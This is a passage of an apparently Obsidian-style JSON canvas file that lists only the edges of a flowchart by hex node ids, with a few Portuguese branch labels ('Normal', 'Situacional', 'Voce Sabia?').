		{"id":"7e55240ab9638494","fromNode":"a3afb6be60781d32","fromSide":"right","toNode":"0421941ad95bc558","toSide":"left"},
		{"id":"61a382c6f184f68f","fromNode":"cf991922d77de479","fromSide":"top","toNode":"c2159b61def60e7c","toSide":"bottom"},
		{"id":"183119cc89e7b5d1","fromNode":"9cb8e00bc35378f6","fromSide":"bottom","toNode":"4995c78f29138d5a","toSide":"top"},
		{"id":"57df101f82917d10","fromNode":"0421941ad95bc558","fromSide":"bottom","toNode":"9d5112e5fd770641","toSide":"top","label":"Normal"},
		{"id":"864faf5335a4ddf0","fromNode":"9d5112e5fd770641","fromSide":"bottom","toNode":"ea938e386e66270f","toSide":"top"},
		{"id":"3045126edfb0f9e8","fromNode":"ea938e386e66270f","fromSide":"right","toNode":"ce81d8e95a097a88","toSide":"left"},
		{"id":"0e5464381351fdbb","fromNode":"ce81d8e95a097a88","fromSide":"top","toNode":"99ebb1d44385978e","toSide":"bottom"},
		{"id":"e3db1055bfb20f4b","fromNode":"0421941ad95bc558","fromSide":"right","toNode":"1c36f68a52774387","toSide":"left"},
		{"id":"d343a67a5d033cce","fromNode":"59a179c2560cb399","fromSide":"top","toNode":"312b50828a050e2c","toSide":"bottom"},
		{"id":"02fd7ca9a0775084","fromNode":"312b50828a050e2c","fromSide":"top","toNode":"5c980f8f47256cf9","toSide":"bottom"},
		{"id":"1b6b9782de0cb930","fromNode":"a0454d1b1d3ccef9","fromSide":"top","toNode":"84d848c130f4f9c2","toSide":"bottom"},
		{"id":"85d0d3439926ccf6","fromNode":"84d848c130f4f9c2","fromSide":"top","toNode":"9baeb5e817ee30df","toSide":"bottom"},
		{"id":"2043e52980a13159","fromNode":"9baeb5e817ee30df","fromSide":"right","toNode":"81143fa817384a06","toSide":"left"},
		{"id":"af090041532adc5f","fromNode":"81143fa817384a06","fromSide":"bottom","toNode":"53680c47741215ba","toSide":"top"},
		{"id":"72799455b54ea18b","fromNode":"53680c47741215ba","fromSide":"bottom","toNode":"70c165c2388777b6","toSide":"top"},
		{"id":"7232d9b7aadde1da","fromNode":"70c165c2388777b6","fromSide":"right","toNode":"e6dc42f8b9c20077","toSide":"left"},
		{"id":"1cea37b14e6d8508","fromNode":"e6dc42f8b9c20077","fromSide":"top","toNode":"69ec6f7713dac483","toSide":"bottom"},
		{"id":"1dce5b3f622dfa8e","fromNode":"69ec6f7713dac483","fromSide":"top","toNode":"124f013c960c5ab2","toSide":"bottom"},
		{"id":"419f576695452f57","fromNode":"04a35c9e8a4b0606","fromSide":"bottom","toNode":"0bbf845f616bbc92","toSide":"top"},
		{"id":"94a03e832c0dc540","fromNode":"0bbf845f616bbc92","fromSide":"bottom","toNode":"36a9b439c58ceb03","toSide":"top"},
		{"id":"143f7373af85c2c8","fromNode":"3304692f3484351b","fromSide":"top","toNode":"579d338576be5192","toSide":"bottom"},
		{"id":"15cd2803c5952106","fromNode":"2a56322eb0305a16","fromSide":"top","toNode":"89b73c01c10062ae","toSide":"right"},
		{"id":"02bd9171e4ad37ad","fromNode":"579d338576be5192","fromSide":"top","toNode":"1377be088be4aca0","toSide":"bottom"},
		{"id":"2a75450c73ed1771","fromNode":"9608105bae9fd053","fromSide":"top","toNode":"3304692f3484351b","toSide":"bottom","label":"Situacional"},
		{"id":"6907eedcd6635c6a","fromNode":"790a16e732a8393e","fromSide":"bottom","toNode":"04a35c9e8a4b0606","toSide":"top","label":"Situacional"},
		{"id":"3976bc0f173167fc","fromNode":"1c36f68a52774387","fromSide":"top","toNode":"a0454d1b1d3ccef9","toSide":"bottom","label":"Normal"},
		{"id":"22d53a1dcf77e558","fromNode":"1c36f68a52774387","fromSide":"top","toNode":"59a179c2560cb399","toSide":"bottom","label":"Situacional"},
		{"id":"b0e024e78b1a27d8","fromNode":"0421941ad95bc558","fromSide":"bottom","toNode":"fc6ab3d07a45b7de","toSide":"top","label":"Voce Sabia?"},
		{"id":"239062bd8235f071","fromNode":"124f013c960c5ab2","fromSide":"top","toNode":"c7ff902dc4775421","toSide":"bottom"},
		{"id":"8634cd5e92c59081","fromNode":"c7ff902dc4775421","fromSide":"left","toNode":"35c85bb74aa1a6e2","toSide":"right"},
		{"id":"db8d6bf38dcdcb24","fromNode":"35c85bb74aa1a6e2","fromSide":"left","toNode":"5413c0a4b44b5781","toSide":"right"},
		{"id":"e9bf4120f16eb4d1","fromNode":"5413c0a4b44b5781","fromSide":"top","toNode":"9c82259ef2669826","toSide":"bottom"},
		{"id":"4ca72233caefe387","fromNode":"5c980f8f47256cf9","fromSide":"top","toNode":"01c35c4871a00676","toSide":"bottom"},
		{"id":"9159064c91808f70","fromNode":"1c36f68a52774387","fromSide":"top","toNode":"7badf503d4512bd4","toSide":"bottom","label":"Voce Sabia?"},
		{"id":"a4ac6ffbc7687f52","fromNode":"9c82259ef2669826","fromSide":"right","toNode":"8a3dc8b754ccfb2e","toSide":"left"},
		{"id":"6e8c65d5e4cf0e15","fromNode":"01c35c4871a00676","fromSide":"top","toNode":"2fc0618a7d1d2399","toSide":"bottom"},
		{"id":"45d84ae653df924b","fromNode":"9c82259ef2669826","fromSide":"top","toNode":"f2f303a711a801c5","toSide":"bottom"},
		{"id":"cf6af410f19eea93","fromNode":"f2f303a711a801c5","fromSide":"top","toNode":"b1176173240d4fc5","toSide":"bottom"},
		{"id":"22dca082541e9804","fromNode":"b1176173240d4fc5","fromSide":"right","toNode":"ba41e0e81b25fc29","toSide":"left"},
		{"id":"c06fc049064712c1","fromNode":"ba41e0e81b25fc29","fromSide":"right","toNode":"b59be8ec17b45638","toSide":"left"},
		{"id":"b2542acbcbe51f5e","fromNode":"b59be8ec17b45638","fromSide":"right","toNode":"6d996a1a8074ac50","toSide":"left"},
		{"id":"5cebb391348a5afe","fromNode":"8a3dc8b754ccfb2e","fromSide":"top","toNode":"833a8d2bd7f13af8","toSide":"bottom"},
		{"id":"d682f91bbc21532a","fromNode":"ed690a4e2739f212","fromSide":"top","toNode":"0497af5db9ff527d","toSide":"bottom"},
		{"id":"3486b9c4684a0904","fromNode":"8a3dc8b754ccfb2e","fromSide":"top","toNode":"0497af5db9ff527d","toSide":"bottom"},
		{"id":"8eb128bae0394986","fromNode":"9c82259ef2669826","fromSide":"top","toNode":"0497af5db9ff527d","toSide":"bottom"},
		{"id":"689f5a291b804c26","fromNode":"8a3dc8b754ccfb2e","fromSide":"right","toNode":"ed690a4e2739f212","toSide":"left"},
		{"id":"bbd47acc6a0642cc","fromNode":"ed690a4e2739f212","fromSide":"right","toNode":"5fc7876d8178155f","toSide":"left"},
		{"id":"f758c2f7180eecef","fromNode":"5fc7876d8178155f","fromSide":"top","toNode":"8276e1bc4b7cc4aa","toSide":"bottom"},
		{"id":"8d9633634d99755b","fromNode":"5fc7876d8178155f","fromSide":"bottom","toNode":"085c26290a044dac","toSide":"top"},
		{"id":"613861e2dfe42d3d","fromNode":"085c26290a044dac","fromSide":"bottom","toNode":"5a6df931aa308a37","toSide":"top"},
		{"id":"1a0d2cf86589eaa8","fromNode":"5a6df931aa308a37","fromSide":"bottom","toNode":"d71a1ae569cfdda2","toSide":"top"},
		{"id":"7f60eb26e387fc55","fromNode":"d71a1ae569cfdda2","fromSide":"bottom","toNode":"75c75698bed3d9d9","toSide":"top"},
		{"id":"a1106033bd91dca2","fromNode":"75c75698bed3d9d9","fromSide":"right","toNode":"eee3bfc938e4c5dc","toSide":"left"},
		{"id":"2b6ac6e865cf6290","fromNode":"00aa7b4da6fcee8d","fromSide":"top","toNode":"d2862136727b5c5f","toSide":"bottom"},
		{"id":"78d0079df290f603","fromNode":"d2862136727b5c5f","fromSide":"top","toNode":"b438ccf19641451a","toSide":"bottom"},
		{"id":"a1844e2983661103","fromNode":"b438ccf19641451a","fromSide":"right","toNode":"6960d0d510e5196f","toSide":"left"},
		{"id":"6b465cc6a095c62a","fromNode":"6960d0d510e5196f","fromSide":"top","toNode":"2cb91fb2adae4fb0","toSide":"bottom"},
		{"id":"fc110730ff494258","fromNode":"2cb91fb2adae4fb0","fromSide":"left","toNode":"0aaff8e8f6547976","toSide":"right"},
		{"id":"36629661a4ffd5e5","fromNode":"0aaff8e8f6547976","fromSide":"top","toNode":"dbeae1aa9bc88056","toSide":"bottom"},
		{"id":"70a8a1b753876b64","fromNode":"dbeae1aa9bc88056","fromSide":"right","toNode":"19297a089f866535","toSide":"left"},
		{"id":"1bce8c73744180c2","fromNode":"19297a089f866535","fromSide":"top","toNode":"7ba4ccf3d144660e","toSide":"bottom"},
		{"id":"8ab22050ad1b9a71","fromNode":"7ba4ccf3d144660e","fromSide":"left","toNode":"7073ea04c75835bd","toSide":"right"},
		{"id":"df0d3b1995b87a54","fromNode":"7073ea04c75835bd","fromSide":"top","toNode":"4828f5025687a707","toSide":"bottom"},
		{"id":"a9b2ccd2db5fd01b","fromNode":"4828f5025687a707","fromSide":"right","toNode":"3051aa8b05716946","toSide":"left"},
		{"id":"3680677c71329118","fromNode":"3051aa8b05716946","fromSide":"top","toNode":"99e45490fcc6b797","toSide":"bottom"},
		{"id":"d8f6e66c640e21a4","fromNode":"d360627e93855242","fromSide":"top","toNode":"ebfe00158a00eae1","toSide":"bottom"},
		{"id":"8c5ba757a21d47f9","fromNode":"ebfe00158a00eae1","fromSide":"right","toNode":"b55f7d815fc99243","toSide":"left"},
		{"id":"9bb1636e3674adc5","fromNode":"b55f7d815fc99243","fromSide":"top","toNode":"575cdd808a7dafde","toSide":"bottom"},
		{"id":"99bcf06233ce4d65","fromNode":"575cdd808a7dafde","fromSide":"left","toNode":"c3bbba0695e98ec5","toSide":"right"},
		{"id":"6002963a5042b804","fromNode":"385f43943ca6db9b","fromSide":"bottom","toNode":"cc81beb8a8c30886","toSide":"top"},
		{"id":"1d37b66a2d039e5a","fromNode":"726597a25256fac0","fromSide":"bottom","toNode":"5d5e89752e802eec","toSide":"top"},
		{"id":"025e7934dc14deac","fromNode":"cc81beb8a8c30886","fromSide":"left","toNode":"726597a25256fac0","toSide":"right"},
		{"id":"5b658d5aaec84874","fromNode":"5d5e89752e802eec","fromSide":"right","toNode":"6ce922a41d3ebb75","toSide":"left"},
		{"id":"8636e280b82bf1ad","fromNode":"6ce922a41d3ebb75","fromSide":"bottom","toNode":"987d9869b9f21a49","toSide":"top"},
		{"id":"07ccb4d573f5106d","fromNode":"987d9869b9f21a49","fromSide":"left","toNode":"4a7e75652be8e60c","toSide":"right"},
		{"id":"3caa6bc4fc9aaf96","fromNode":"4a7e75652be8e60c","fromSide":"bottom","toNode":"50c98c7323b1299c","toSide":"top"},
		{"id":"10aef437439f65f8","fromNode":"1c36f68a52774387","fromSide":"right","toNode":"7d25db650b858cd3","toSide":"left"},
		{"id":"9ab27ff15d8fc80a","fromNode":"7d25db650b858cd3","fromSide":"right","toNode":"9f6f960e93953285","toSide":"left"},
		{"id":"aceb9628137cc95a","fromNode":"50c98c7323b1299c","fromSide":"right","toNode":"35ed78a7899bbe0a","toSide":"left"},
		{"id":"daa3e2823e074d48","fromNode":"35ed78a7899bbe0a","fromSide":"bottom","toNode":"932d1572de41c31a","toSide":"top"},
		{"id":"9afb0fcf89590100","fromNode":"932d1572de41c31a","fromSide":"left","toNode":"b2272ea06868c0fb","toSide":"right"},
		{"id":"210effdbfb70321b","fromNode":"b2272ea06868c0fb","fromSide":"bottom","toNode":"62c79abd6232738a","toSide":"top"},
		{"id":"fb3ed6d89de4f6c4","fromNode":"62c79abd6232738a","fromSide":"right","toNode":"2e8ce15e752fba87","toSide":"left"},
		{"id":"34c960e8e1304716","fromNode":"2e8ce15e752fba87","fromSide":"right","toNode":"f47324762fc5489c","toSide":"left"},
		{"id":"6e57945bf08e702a","fromNode":"f47324762fc5489c","fromSide":"top","toNode":"d7ac96cc6012e094","toSide":"bottom"},
		{"id":"845d6a3ed5c71307","fromNode":"d7ac96cc6012e094","fromSide":"top","toNode":"81f7bac36bd25afa","toSide":"bottom"},
		{"id":"f1426cb1cd5767ed","fromNode":"81f7bac36bd25afa","fromSide":"top","toNode":"047b9eab464f60ee","toSide":"bottom"},
		{"id":"4908754571640d32","fromNode":"047b9eab464f60ee","fromSide":"top","toNode":"881cf3f192db66bf","toSide":"bottom"},
		{"id":"7e467a43b7ed444f","fromNode":"881cf3f192db66bf","fromSide":"top","toNode":"e037350a75f0db31","toSide":"bottom"},
		{"id":"1e74678837e91bd5","fromNode":"e037350a75f0db31","fromSide":"top","toNode":"10d8a6510adb7920","toSide":"bottom"},
		{"id":"f58c58867ed3c9da","fromNode":"7d25db650b858cd3","fromSide":"bottom","toNode":"aba11d23423eba1c","toSide":"top"},
		{"id":"ef67b0a046cdd185","fromNode":"aba11d23423eba1c","fromSide":"bottom","toNode":"b718298fb16f669a","toSide":"top"},
		{"id":"0b85a03d1662127a","fromNode":"b718298fb16f669a","fromSide":"bottom","toNode":"57e9f8bc20c49758","toSide":"top"},
		{"id":"da24226eba32586f","fromNode":"57e9f8bc20c49758","fromSide":"bottom","toNode":"5a858338a818f77a","toSide":"top"},
		{"id":"2caec2b640135ea1","fromNode":"5a858338a818f77a","fromSide":"bottom","toNode":"c76185f19800214f","toSide":"top"},
		{"id":"ef66497992900d81","fromNode":"2f22a1dd96fd21db","fromSide":"top","toNode":"dc30bb7a0f4cbb28","toSide":"bottom"},
		{"id":"8d749b4de05648b9","fromNode":"dc30bb7a0f4cbb28","fromSide":"top","toNode":"b2cdcdfa8f360023","toSide":"bottom"},
		{"id":"b6845793f4137e86","fromNode":"b2cdcdfa8f360023","fromSide":"top","toNode":"c1f661940fcd0d62","toSide":"bottom"},
		{"id":"025b89087a8c475a","fromNode":"9f6f960e93953285","fromSide":"bottom","toNode":"e9fcd97d832edd0e","toSide":"top"},
		{"id":"5075058e3153048f","fromNode":"e9fcd97d832edd0e","fromSide":"right","toNode":"a8d9d9fc3d6b615f","toSide":"left"},
		{"id":"afac40343e1ae499","fromNode":"a8d9d9fc3d6b615f","fromSide":"right","toNode":"1e81ce44fb964b47","toSide":"left"},
		{"id":"b37e17fb392fad59","fromNode":"1e81ce44fb964b47","fromSide":"right","toNode":"1bb03cf9ddf59f2c","toSide":"left"},
		{"id":"af45d8f9dd1a9a90","fromNode":"4cdc0deb61556ec0","fromSide":"left","toNode":"7fdfec9ef41c79e7","toSide":"right"},
		{"id":"e7023538acb9c08a","fromNode":"7fdfec9ef41c79e7","fromSide":"left","toNode":"67bd4de22ea46ab9","toSide":"right"},
		{"id":"5d237fed49263a18","fromNode":"e9fcd97d832edd0e","fromSide":"bottom","toNode":"8a921ffaa65bbd7d","toSide":"top"},
		{"id":"7ab5347be9842a4a","fromNode":"8a921ffaa65bbd7d","fromSide":"right","toNode":"3942ff1ba7117d26","toSide":"left"},
		{"id":"2776d23d049e580a","fromNode":"3942ff1ba7117d26","fromSide":"right","toNode":"c2e8b6b68f057000","toSide":"left"},
		{"id":"4e4645ed95561ae1","fromNode":"1bb03cf9ddf59f2c","fromSide":"bottom","toNode":"4cdc0deb61556ec0","toSide":"top"},
		{"id":"e76ecd360cd0acd0","fromNode":"c2e8b6b68f057000","fromSide":"right","toNode":"587f3990a382907f","toSide":"left"},
		{"id":"f7f15d9962e453a6","fromNode":"587f3990a382907f","fromSide":"bottom","toNode":"6a27f6c07f3e6268","toSide":"top"},
		{"id":"cf91301e98f9b208","fromNode":"6a27f6c07f3e6268","fromSide":"left","toNode":"06be28477aab91f0","toSide":"right"},
		{"id":"fd83b0229be1ec22","fromNode":"06be28477aab91f0","fromSide":"left","toNode":"adc29bf390de2880","toSide":"right"},
		{"id":"1d056128cd9ecb60","fromNode":"c76185f19800214f","fromSide":"right","toNode":"253f1f3c24c74fb3","toSide":"left"}
	]
}